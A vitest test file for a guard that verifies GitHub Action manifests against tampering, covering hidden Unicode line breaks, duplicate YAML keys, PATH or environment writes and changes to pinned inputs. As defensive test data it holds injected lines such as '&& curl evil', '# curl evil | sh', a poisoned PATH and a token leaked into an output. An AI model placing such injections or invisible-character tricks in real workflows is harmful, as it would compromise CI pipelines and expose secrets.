import { readFileSync } from 'node:fs';
import { fileURLToPath, pathToFileURL } from 'node:url';

import { beforeAll, describe, expect, it } from 'vitest';

// The refused cases are those the reviews of #687 and #689 found passing an earlier version of the
// manifest checks, plus cases added with the inputs:/outputs: pin and one for each character the
// guard refuses; the accepted cases are edits the guard must keep accepting. The guard runs in
// memory here; scripts/validate-distribution-metadata.mjs runs the same function on the committed
// manifests. Characters that YAML reads differently from a text check are built with
// String.fromCodePoint so that no invisible character sits in this file.

type Form = 'root' | 'nested';

interface Guard {
  checkActionManifest(manifestName: string, manifest: string, form: Form): void;
  computeInputsOutputsSha256(manifestName: string, manifest: string): string;
  readonly ACTION_INPUTS_OUTPUTS_SHA256: Readonly<Record<Form, string>>;
}

const GUARD_URL = pathToFileURL(fileURLToPath(new URL('../../scripts/action-manifest-guard.mjs', import.meta.url))).href;

const MANIFESTS: ReadonlyArray<readonly [Form, string, string]> = [
  ['root', 'action.yml', readFileSync(fileURLToPath(new URL('../../action.yml', import.meta.url)), 'utf8')],
  ['nested', 'action/action.yml', readFileSync(fileURLToPath(new URL('../../action/action.yml', import.meta.url)), 'utf8')],
];

const CR = String.fromCodePoint(0x0d);
const NEL = String.fromCodePoint(0x85);
const LS = String.fromCodePoint(0x2028);
const PS = String.fromCodePoint(0x2029);
const NBSP = String.fromCodePoint(0xa0);
const EM_SPACE = String.fromCodePoint(0x2003);
const IDEOGRAPHIC_SPACE = String.fromCodePoint(0x3000);
const OGHAM_SPACE = String.fromCodePoint(0x1680);
const NARROW_NBSP = String.fromCodePoint(0x202f);
const BOM = String.fromCodePoint(0xfeff);

// Replaces the first match of `from`, at or after `after` when given. Throws when nothing matches,
// so a case whose anchor drifted fails instead of passing an unmutated manifest.
function swap(text: string, from: string | RegExp, to: string, after?: string): string {
  const offset = after === undefined ? 0 : text.indexOf(after);
  if (offset < 0) throw new Error(`anchor not found: ${after}`);
  const head = text.slice(0, offset);
  const tail = text.slice(offset);
  const index = typeof from === 'string' ? tail.indexOf(from) : tail.search(from);
  if (index < 0) throw new Error(`mutation anchor not found: ${String(from)}`);
  const matched = typeof from === 'string' ? from : (tail.match(from)?.[0] ?? '');
  return head + tail.slice(0, index) + to + tail.slice(index + matched.length);
}

const INSTALL = '    - name: Install dependencies\n';
const BUILD = '    - name: Build the Cejel CLI\n';
const RUNNER_STEP = '    - name: Run Cejel';
const RUNNER_LINE = /      run: node "\$GITHUB_ACTION_PATH\/[^"\n]+"/;
const CEJEL_DIR_LINE = /        cejel_dir=[^\n]+/;
const SELF_CHECK =
  '        ran="pnpm@$("$pnpm" --version)"\n' +
  '        if [ "$ran" != "$CEJEL_PNPM" ]; then\n' +
  '          echo "::error::expected $CEJEL_PNPM from this action\'s package.json, installed $ran"\n' +
  '          exit 1\n' +
  '        fi\n';
const NPM_INSTALL =
  'npm install --prefix "$work" --no-save --no-package-lock --ignore-scripts --no-audit --no-fund "$CEJEL_PNPM"';
const INSTALL_ENV = '      env:\n        CEJEL_PNPM: ${{ steps.cejel-pnpm.outputs.spec }}\n';
const RUNNER_ENV = '        WITAN_REPO_PATH: ${{ inputs.repo-path }}\n';
const ADDED_STEP = '    - name: Extra\n      shell: bash\n      run: pnpm install\n\n';
const RUBRIC_DEFAULT =
  "fetch-depth: 0. v27 reads the commit history, so a shallow clone gets no full v27 result.\n    required: false\n    default: ''\n";
const DESCRIPTION_START = /^description: (?:'|>-\n  )/m;
const PROSPECTIVE = 'witan-rubric-v27-prospective-2026-10-19';

type Mutation = (text: string) => string;

// Each refused case names the check that must refuse it. The canonical comparison catches almost
// anything inside runs:, so a bare toThrow() would pass while an earlier check had stopped working
// (Pass A of #694 removed NEL, LS, PS and the lone CR from the refusal one at a time and every case
// still threw). The message is asserted, not just the throw.
const REFUSAL = {
  hidden: /contains U\+[0-9A-F]{4} at offset/,
  marker: /contains a YAML document marker/,
  key: /must have exactly one top-level (?:inputs|outputs|runs): key/,
  actionSetup: /uses pnpm\/action-setup/,
  actionPath: /interpolates github\.action_path/,
  jobEnv: /writes to the calling job's PATH or environment/,
  npmExec: /runs npm exec or npx/,
  runs: /runs: section differs from the canonical/,
  hash: /inputs:\/outputs: sections do not match the pinned SHA-256/,
} as const;

const REFUSED: ReadonlyArray<readonly [string, RegExp, Mutation]> = [
  // The first review of #687: one step's isolation removed, or an extra step.
  ['cejel_dir set to the caller workspace in install only', REFUSAL.runs, (t) => swap(t, CEJEL_DIR_LINE, '        cejel_dir="$GITHUB_WORKSPACE"', INSTALL)],
  ['cd "$work" removed from build', REFUSAL.runs, (t) => swap(t, '        cd "$work"\n', '', BUILD)],
  ['version self-check removed from build', REFUSAL.runs, (t) => swap(t, SELF_CHECK, '', BUILD)],
  ['set -euo pipefail removed from install', REFUSAL.runs, (t) => swap(t, '        set -euo pipefail\n', '', INSTALL)],
  ['empty package.json write removed from install', REFUSAL.runs, (t) => swap(t, "        printf '{}\\n' > package.json\n", '', INSTALL)],
  ['bare pnpm from PATH in build', REFUSAL.runs, (t) => swap(t, '"$pnpm" --dir "$cejel_dir" run build', 'pnpm --dir "$cejel_dir" run build')],
  [
    'fail-open cd "$(mktemp …)"',
    REFUSAL.runs,
    (t) =>
      swap(
        t,
        '        work="$(mktemp -d "$RUNNER_TEMP/cejel-pnpm.XXXXXX")"\n        cd "$work"\n',
        '        cd "$(mktemp -d "$RUNNER_TEMP/cejel-pnpm.XXXXXX")"\n        work="$PWD"\n',
        INSTALL,
      ),
  ],
  ['an added named run: pnpm install step', REFUSAL.runs, (t) => swap(t, BUILD, ADDED_STEP + BUILD)],
  ['an added unnamed - run: pnpm -v step', REFUSAL.runs, (t) => swap(t, BUILD, '    - run: pnpm -v\n      shell: bash\n\n' + BUILD)],
  ['an extra command on the runner line', REFUSAL.runs, (t) => t.replace(RUNNER_LINE, (m) => `${m} && curl evil`)],
  ['package-manager-cache: false removed', REFUSAL.runs, (t) => swap(t, '        package-manager-cache: false\n', '')],
  ['the version regex loosened', REFUSAL.runs, (t) => swap(t, String.raw`(pnpm@\d+\.\d+\.\d+)`, String.raw`(pnpm@\S+)`)],
  ['a GITHUB_PATH write', REFUSAL.jobEnv, (t) => swap(t, '        cd "$work"\n', '        cd "$work"\n        echo "$work" >> "$GITHUB_PATH"\n', INSTALL)],
  ['a re-added pnpm/action-setup step', REFUSAL.actionSetup, (t) => swap(t, INSTALL, '    - uses: pnpm/action-setup@a7487c7e89a18df4991f7f222e4898a00d66ddda\n\n' + INSTALL)],
  ['github.action_path interpolated in the runner line', REFUSAL.actionPath, (t) => t.replace(RUNNER_LINE, (m) => m.replace('$GITHUB_ACTION_PATH', '${{ github.action_path }}'))],
  ['a GITHUB_ENV write', REFUSAL.jobEnv, (t) => swap(t, '        cd "$work"\n', '        cd "$work"\n        echo "NODE_OPTIONS=--require=x" >> "$GITHUB_ENV"\n', INSTALL)],
  // dcb7a63fc: the npm install --prefix design.
  ['--prefix removed', REFUSAL.runs, (t) => swap(t, NPM_INSTALL, NPM_INSTALL.replace(' --prefix "$work"', ''), INSTALL)],
  ['--ignore-scripts removed', REFUSAL.runs, (t) => swap(t, NPM_INSTALL, NPM_INSTALL.replace(' --ignore-scripts', ''), INSTALL)],
  ['a return to npm exec', REFUSAL.npmExec, (t) => swap(t, '"$pnpm" --dir "$cejel_dir" install', 'npm exec --yes -- "$CEJEL_PNPM" --dir "$cejel_dir" install')],
  ['a flow-style step', REFUSAL.runs, (t) => swap(t, BUILD, '    - { name: Extra, shell: bash, run: pnpm install }\n\n' + BUILD)],
  ['an if:-first uses: step', REFUSAL.runs, (t) => swap(t, BUILD, "    - if: always()\n      uses: actions/cache@0400d5f644dc74513175e3cd8d07132dd4860809\n      with:\n        path: x\n        key: x\n\n" + BUILD)],
  ['an env:-first run step', REFUSAL.runs, (t) => swap(t, BUILD, '    - env:\n        X: y\n      shell: bash\n      run: pnpm install\n\n' + BUILD)],
  ['a literal CEJEL_PNPM', REFUSAL.runs, (t) => swap(t, '        CEJEL_PNPM: ${{ steps.cejel-pnpm.outputs.spec }}', '        CEJEL_PNPM: pnpm@9.0.0', INSTALL)],
  ['CEJEL_PNPM fed from a new input', REFUSAL.runs, (t) => swap(swap(t, '        CEJEL_PNPM: ${{ steps.cejel-pnpm.outputs.spec }}', '        CEJEL_PNPM: ${{ inputs.pnpm }}', INSTALL), 'outputs:\n', "  pnpm:\n    description: 'pnpm'\n    default: 'pnpm@9.0.0'\noutputs:\n")],
  ['step env: setting PATH', REFUSAL.runs, (t) => swap(t, INSTALL_ENV, INSTALL_ENV + '        PATH: /tmp/evil:/usr/bin\n', INSTALL)],
  ['step env: setting NPM_CONFIG_REGISTRY', REFUSAL.runs, (t) => swap(t, INSTALL_ENV, INSTALL_ENV + '        NPM_CONFIG_REGISTRY: https://registry.example\n', INSTALL)],
  ['step env: setting RUNNER_TEMP', REFUSAL.runs, (t) => swap(t, INSTALL_ENV, INSTALL_ENV + '        RUNNER_TEMP: .\n', INSTALL)],
  ['working-directory on install', REFUSAL.runs, (t) => swap(t, '      shell: bash\n', '      shell: bash\n      working-directory: ${{ github.workspace }}\n', INSTALL)],
  ['continue-on-error on install', REFUSAL.runs, (t) => swap(t, '      shell: bash\n', '      shell: bash\n      continue-on-error: true\n', INSTALL)],
  ['shell: sh on install', REFUSAL.runs, (t) => swap(t, '      shell: bash\n', '      shell: sh\n', INSTALL)],
  ['setup-node cache: pnpm', REFUSAL.runs, (t) => swap(t, '        package-manager-cache: false\n', '        package-manager-cache: false\n        cache: pnpm\n')],
  ['package-manager-cache left only in a comment', REFUSAL.runs, (t) => swap(t, '        package-manager-cache: false\n', '        # package-manager-cache: false\n')],
  ['setup-node node-version-file', REFUSAL.runs, (t) => swap(t, "        node-version: '22'\n", '        node-version-file: .nvmrc\n')],
  ['setup-node floating @v6', REFUSAL.runs, (t) => swap(t, /actions\/setup-node@[0-9a-f]{40} # v6/, 'actions/setup-node@v6')],
  ['a top-level key after runs:', REFUSAL.runs, (t) => `${t.replace(/\n+$/, '')}\nx-extra: 1\n`],
  // 3e8b9d436: a lone CR, NEL, LS or PS is a line break to YamlDotNet 5.3.0 but not to /\r?\n/.
  ...([
    ['CR', CR],
    ['NEL', NEL],
    ['LS', LS],
    ['PS', PS],
  ] as const).flatMap(([label, br]) => [
    [`a step hidden after a ${label} in a comment`, REFUSAL.hidden, (t: string) => swap(t, BUILD, `    # note${br}    - name: Extra${br}      shell: bash${br}      run: pnpm install\n${BUILD}`)] as const,
    [`a script line hidden after a ${label}`, REFUSAL.hidden, (t: string) => swap(t, '        cd "$work"\n', `        cd "$work" # note${br}        echo x >> "$GITHUB_OUTPUT"\n`, INSTALL)] as const,
    [`a step env PATH hidden after a ${label}`, REFUSAL.hidden, (t: string) => swap(t, INSTALL_ENV, `${INSTALL_ENV.trimEnd()} # note${br}        PATH: /tmp/evil\n`, INSTALL)] as const,
    [`an if: false hidden after a ${label}`, REFUSAL.hidden, (t: string) => swap(t, '      shell: bash\n', `      shell: bash # note${br}      if: false\n`, INSTALL)] as const,
  ]),
  // The same line breaks above inputs:, where no byte comparison or hash would catch them (Pass A
  // of #694): a second document, or a second runs: key, hidden after one in a comment.
  ...([
    ['CR', CR],
    ['NEL', NEL],
    ['LS', LS],
    ['PS', PS],
  ] as const).flatMap(([label, br]) => [
    [`a document marker hidden after a ${label} above inputs:`, REFUSAL.hidden, (t: string) => swap(t, 'author:', `# note${br}---${br}x: 1\nauthor:`)] as const,
    [`a runs: key hidden after a ${label} above inputs:`, REFUSAL.hidden, (t: string) => swap(t, 'author:', `# note${br}"runs":${br}  using: node20\nauthor:`)] as const,
  ]),
  // Every character the refusal names, alone in the free description: removing any entry, or either
  // end of a range, from the refusal makes one of these pass.
  ...[0x0, 0x8, 0xb, 0xc, 0xe, 0x1f, 0x7f, 0x85, 0xa0, 0x1680, 0x2000, 0x200a, 0x2028, 0x2029, 0x202f, 0x205f, 0x3000, 0xfeff].map(
    (codePoint) =>
      [
        `U+${codePoint.toString(16).toUpperCase().padStart(4, '0')} in the description`,
        REFUSAL.hidden,
        (t: string) => t.replace(DESCRIPTION_START, (m) => `${m}x${String.fromCodePoint(codePoint)}x`),
      ] as const,
  ),
  ['a lone CR in the description', REFUSAL.hidden, (t) => t.replace(DESCRIPTION_START, (m) => `${m}x${CR}x`)],
  ['a document end marker above inputs:', REFUSAL.marker, (t) => swap(t, 'author:', '...\nauthor:')],
  ['a second YAML document', REFUSAL.marker, (t) => `${t.replace(/\n+$/, '')}\n---\nruns:\n  using: node20\n  main: x.js\n`],
  ['a document start marker at the top', REFUSAL.marker, (t) => `---\n${t}`],
  ['a duplicate quoted "runs": before the real one', REFUSAL.key, (t) => swap(t, 'inputs:\n', '"runs":\n  using: node20\n  main: x.js\ninputs:\n')],
  ['a BOM', REFUSAL.hidden, (t) => BOM + t],
  // b2ca8e3ea: lines that look like comments to a text check but are script or scalar to YAML.
  ['a # line breaking out of the node -e quote', REFUSAL.runs, (t) => swap(t, '          process.stdout.write(match[1]);\n', "          process.stdout.write(match[1]);\n#' ; echo x >> \"$GITHUB_OUTPUT\" ; : '\n")],
  ['a # line plus a GITHUB_PATH write in install', REFUSAL.jobEnv, (t) => swap(t, '        cd "$work"\n', '        cd "$work"\n        # keep\n        echo "$work" >> "$GITHUB_PATH"\n', INSTALL)],
  ['a plain comment line inside a script', REFUSAL.runs, (t) => swap(t, '        cd "$work"\n', '        cd "$work"\n        # a comment\n', INSTALL)],
  ...([
    ['U+00A0', NBSP],
    ['U+3000', IDEOGRAPHIC_SPACE],
    ['U+1680', OGHAM_SPACE],
  ] as const).map(
    ([label, space]) =>
      [`a ${label}-led # line in the install script`, REFUSAL.hidden, (t: string) => swap(t, '        cd "$work"\n', `        cd "$work"\n${space}# curl evil | sh\n`, INSTALL)] as const,
  ),
  ['an NBSP continuation under the runner line', REFUSAL.hidden, (t) => t.replace(RUNNER_LINE, (m) => `${m}\n${NBSP}      && curl evil`)],
  ['an EM SPACE continuation under the runner line', REFUSAL.hidden, (t) => t.replace(RUNNER_LINE, (m) => `${m}\n${EM_SPACE}      && curl evil`)],
  ['a U+202F continuation inside env:', REFUSAL.hidden, (t) => swap(t, RUNNER_ENV, `${RUNNER_ENV}${NARROW_NBSP}PATH: /tmp/evil\n`, RUNNER_STEP)],
  ['a column-0 comment inside runs:', REFUSAL.runs, (t) => swap(t, INSTALL, `# note\n${INSTALL}`)],
  ['a comment after runs:', REFUSAL.runs, (t) => `${t.replace(/\n+$/, '')}\n# trailing note\n`],
  ['U+00A0 in the description', REFUSAL.hidden, (t) => t.replace(DESCRIPTION_START, (m) => `${m}${NBSP}`)],
  // #689: inputs: and outputs: sit outside runs: and were pinned only in part, or not at all.
  ['out-dir default changed to .', REFUSAL.hash, (t) => swap(t, "    default: '.cejel'\n", "    default: '.'\n")],
  ['repo-path default changed to /', REFUSAL.hash, (t) => swap(t, "    required: false\n    default: ''\n", "    required: false\n    default: '/'\n", '  repo-path:\n')],
  ['min-score default set', REFUSAL.hash, (t) => swap(t, "    default: ''\n", "    default: '4'\n", '  min-score:\n')],
  ['rubric-pin default set to a prospective rubric', REFUSAL.hash, (t) => swap(t, "    default: ''\n", `    default: '${PROSPECTIVE}'\n`, '  rubric-pin:\n')],
  ['a new input', REFUSAL.hash, (t) => swap(t, 'outputs:\n', "  extra:\n    description: 'x'\n    required: false\n    default: ''\noutputs:\n")],
  ['an input marked required', REFUSAL.hash, (t) => swap(t, '    required: false\n', '    required: true\n', '  out-dir:\n')],
  ['an output value set to the token', REFUSAL.hash, (t) => swap(t, '${{ steps.witan-run.outputs.score }}', '${{ github.token }}')],
  ['an output removed', REFUSAL.hash, (t) => swap(t, /  limitations:\n[^\n]+\n[^\n]+\n/, '')],
  ['an output description changed', REFUSAL.hash, (t) => swap(t, 'Overall Cejel trust score', 'Overall trust score')],
  ['a comment inside inputs:', REFUSAL.hash, (t) => swap(t, '  repo-path:\n', '  # the repository\n  repo-path:\n')],
  ['a second inputs: key above the real one', REFUSAL.key, (t) => swap(t, 'inputs:\n', "inputs:\n  extra:\n    default: 'x'\ninputs:\n")],
  ['a quoted duplicate "inputs": above the real one', REFUSAL.key, (t) => swap(t, 'inputs:\n', "\"inputs\":\n  repo-path:\n    default: '/'\ninputs:\n")],
  ['a quoted duplicate "outputs": above inputs:', REFUSAL.key, (t) => swap(t, 'inputs:\n', "\"outputs\":\n  score:\n    value: x\ninputs:\n")],
  ['inputs: written with a trailing comment', REFUSAL.key, (t) => swap(t, 'inputs:\n', 'inputs: # pinned\n')],
  [
    'the rubric-pin decoy in a block scalar above inputs:, real default changed',
    REFUSAL.hash,
    (t) =>
      swap(
        swap(t, 'inputs:\n', `x-decoy: |\n  ${RUBRIC_DEFAULT.replace(/\n/g, '\n  ')}\ninputs:\n`),
        "    default: ''\n",
        `    default: '${PROSPECTIVE}'\n`,
        '  rubric-pin:\n',
      ),
  ],
  [
    'the rubric-pin decoy in a quoted description after the real default',
    REFUSAL.hash,
    (t) =>
      swap(
        t,
        /  rubric-pin:\n(?:    [^\n]*\n|      [^\n]*\n)+/,
        `  rubric-pin:\n    required: false\n    default: '${PROSPECTIVE}'\n    description: "Explicit opt-in only.\n      ${RUBRIC_DEFAULT.replace(/\n/g, '\n      ')}"\n`,
      ),
  ],
];

const ACCEPTED: ReadonlyArray<readonly [string, Mutation]> = [
  ['the committed manifest', (t) => t],
  ['an edited description', (t) => t.replace(DESCRIPTION_START, (m) => `${m}Edited. `)],
  ['a comment line added above inputs:', (t) => swap(t, 'inputs:\n', '# One more note.\ninputs:\n')],
  ['a branding colour change', (t) => swap(t, "  color: 'green'\n", "  color: 'blue'\n")],
  ['CRLF line endings', (t) => t.replace(/\n/g, '\r\n')],
  ['extra trailing newlines', (t) => `${t}\n\n`],
  // Free text above inputs: cannot change the pinned region; the decoy alone is harmless.
  ['the rubric-pin text in a block scalar above inputs:', (t) => swap(t, 'inputs:\n', `x-decoy: |\n  ${RUBRIC_DEFAULT.replace(/\n/g, '\n  ')}\ninputs:\n`)],
];

describe('action-manifest-guard', () => {
  let guard: Guard;
  beforeAll(async () => {
    guard = (await import(GUARD_URL)) as Guard;
  });

  for (const [form, name, manifest] of MANIFESTS) {
    describe(`${name} (${form})`, () => {
      for (const [label, mutate] of ACCEPTED) {
        it(`accepts ${label}`, () => {
          const mutated = mutate(manifest);
          if (label !== 'the committed manifest') expect(mutated).not.toBe(manifest);
          expect(() => guard.checkActionManifest(name, mutated, form)).not.toThrow();
        });
      }

      for (const [label, refusal, mutate] of REFUSED) {
        it(`refuses ${label}`, () => {
          const mutated = mutate(manifest);
          expect(mutated).not.toBe(manifest);
          expect(() => guard.checkActionManifest(name, mutated, form)).toThrow(refusal);
        });
      }

      it('refuses the other form', () => {
        const other: Form = form === 'root' ? 'nested' : 'root';
        expect(() => guard.checkActionManifest(name, manifest, other)).toThrow(/runs: section differs/);
      });

      it('names the actual hash when the inputs:/outputs: pin does not match', () => {
        const mutated = swap(manifest, "    default: '.cejel'\n", "    default: '.'\n");
        const actual = guard.computeInputsOutputsSha256(name, mutated);
        expect(actual).not.toBe(guard.ACTION_INPUTS_OUTPUTS_SHA256[form]);
        expect(() => guard.checkActionManifest(name, mutated, form)).toThrow(actual);
      });
    });
  }
});
